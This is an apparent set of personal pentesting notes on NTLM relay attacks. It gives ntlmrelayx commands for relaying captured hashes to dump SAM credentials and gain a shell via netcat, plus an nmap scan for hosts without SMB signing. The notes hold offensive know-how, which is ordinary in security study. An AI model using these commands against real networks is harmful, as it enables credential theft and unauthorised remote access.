**NTLMrelayx**

relays captured hash hash
would capture SAM hashes (equivalent to shadow in linux)

syntax: 
```
ntlmrelayx.py -tf <target-host.txt> -smb2support
```

![file:///tmp/.HZGD42/1.png](file:///tmp/.HZGD42/1.png)

<h4>gaining shell</h4>
**gaining shell thru ntlmrelayx**

syntax: 
```
ntlmrelayx.py -tf <target-host.txt> -smb2support
```
open netcat with indicated port

![file:///tmp/.HZGD42/1.png](file:///tmp/.HZGD42/1.png)

![file:///tmp/.HZGD42/2.png](file:///tmp/.HZGD42/2.png)


<h3>finding SMB Signing on or off</h4>

nmap
(ip must be an entire network)
```
nmap --script=smb2-security-mode.nse -p445 192.168.50.0/24

```

![file:///tmp/.HZGD42/1.png](file:///tmp/.HZGD42/1.png)

we can relay on hosts that does not require these
save these hosts on DIFFERENT text files

